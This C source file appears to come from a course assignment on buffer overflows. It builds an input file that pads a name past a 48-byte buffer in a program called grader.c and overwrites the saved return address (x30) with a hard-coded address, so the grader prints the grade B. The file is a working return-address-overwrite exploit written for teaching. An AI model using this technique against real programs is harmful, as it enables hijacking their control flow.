/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Tharun Kumar Tiruppali Kalidoss, Sarika Ahire              */
/*--------------------------------------------------------------------*/

#include <assert.h>
#include <stddef.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

/* the expected length of the input */
enum {INPUT_LENGTH = 13};

/* the size of the buffer in grader.c */
enum {BUFFER_LENGTH = 48};
/*
    this main function reads the first INPUT_LENGTH characters 
    from stdin, and stores them as the name for the grade to 
    be changed. It writes into the file "dataB" the required
    bytes and null bytes to skip to line 45 in main() of grader.c.
    This results in grader.c printing the grade B for any given 
    name to this file. returns 0 for successful completion, and 
    takes no parameters. 
*/
int main(void) {
    FILE* psFile;
    char input[INPUT_LENGTH];
    size_t remainingChars;
    unsigned long ret;
    /* address of the "grade = 'B'" line in grader.c "*/
    ret = 4196440lu;

    fgets(input, INPUT_LENGTH, stdin);
    psFile = fopen("dataB", "w");
    /* the remaining number of characters required to fill the
        48 character limit */
    remainingChars = BUFFER_LENGTH-strlen(input);
    fprintf(psFile,"%s",input);
    while(remainingChars>0) {
        fprintf(psFile,"%c", '\0');
        remainingChars--;
    }
    /* overwriting the to-be value of x30, pointing it to the 
        grade=B*/
    fwrite(&ret, sizeof(unsigned long), 1, psFile);
    return 0;
}